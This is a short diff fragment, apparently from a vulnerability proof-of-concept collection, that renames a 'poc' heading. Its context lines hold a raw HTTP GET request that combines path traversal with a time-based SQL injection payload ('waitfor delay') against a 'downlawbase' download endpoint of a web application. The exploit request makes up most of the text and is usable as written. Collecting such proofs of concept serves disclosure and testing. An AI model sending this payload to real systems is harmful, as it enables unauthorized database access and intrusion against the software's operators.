@@ -2,7 +2,7 @@
 
 
 
-## poc
+## POC
 ```
 GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:2'--+ HTTP/1.1
 Host: 
